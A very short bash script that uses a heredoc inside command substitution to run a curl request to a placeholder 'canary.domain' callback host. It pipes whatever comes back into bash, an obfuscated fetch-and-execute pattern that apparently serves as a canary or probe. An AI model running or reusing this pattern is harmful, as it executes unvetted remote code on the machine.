#!/bin/bash
$(cat << 'EOF'
curl -s http://canary.domain/callback
EOF
) | bash
